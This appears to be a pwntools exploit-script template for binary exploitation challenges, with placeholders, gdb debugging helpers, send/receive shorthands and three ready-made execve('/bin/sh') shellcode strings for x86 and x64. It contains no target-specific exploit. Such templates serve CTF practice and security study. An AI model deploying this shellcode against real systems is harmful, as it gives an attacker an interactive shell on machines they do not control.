#!/usr/bin/env python3

# %%
from pwn import *
from LibcSearcher import *

{bindings}

context.binary = {bin_name}
context.os = 'linux'
context.arch = context.binary.arch
# context.terminal = ['alacritty', '-e']
context.terminal = ['wt.exe', 'wsl', '--']

local = True
if local:
    context.log_level = 'debug'
    p = process({proc_args})
else:
    p = remote("addr", 1337)


def dbgaddr(addr, PIE=False):  # PIE enabled
    if local:
        if PIE:
            text_base = int(
                os.popen("pmap {{}}| awk '{{{{print $1}}}}'".format(p.pid)).readlines()[1], 16)
            log.info(f'b *{{hex(text_base + addr)}}\n')
            gdb.attach(p, f'b *{{hex(text_base + addr)}}')
        else:
            gdb.attach(p, f'b *{{hex(addr)}}')


def dbg(func=''):
    if local:
        gdb.attach(p, func)


# %%

s = lambda str: p.send(str)
sl = lambda str: p.sendline(str)
sa = lambda delims, str: p.sendafter(delims, str)
sla = lambda delims, str: p.sendlineafter(delims, str)
r = lambda numb=4096: p.recv(numb)
rl = lambda: p.recvline()
ru = lambda delims, drop=True: p.recvuntil(delims, drop)
uu32 = lambda data: u32(data.ljust(4, b'\x00'))
uu64 = lambda data: u64(data.ljust(8, b'\x00'))
li = lambda str, data: log.success(str + '========>' + hex(data))

# %%
sh_x86_18 = b"\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20 = b"\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21 = b"\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
# https://www.exploit-db.com/shellcodes

# %%


# %%

p.interactive()
